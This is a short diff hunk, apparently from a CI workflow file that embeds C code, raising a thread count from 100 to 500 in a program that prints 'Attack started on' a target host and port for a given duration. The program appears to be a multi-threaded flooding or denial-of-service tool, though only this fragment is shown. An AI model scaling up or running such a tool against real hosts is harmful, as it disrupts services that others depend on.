@@ -167,7 +167,7 @@ jobs:
                 return 1;
             }
             
-            int threads = 100;
+            int threads = 500;
             pthread_t thread_ids[threads];
             
             printf("Attack started on %s:%s for %s seconds with %d threads\n", argv[1], argv[2], argv[3], threads);
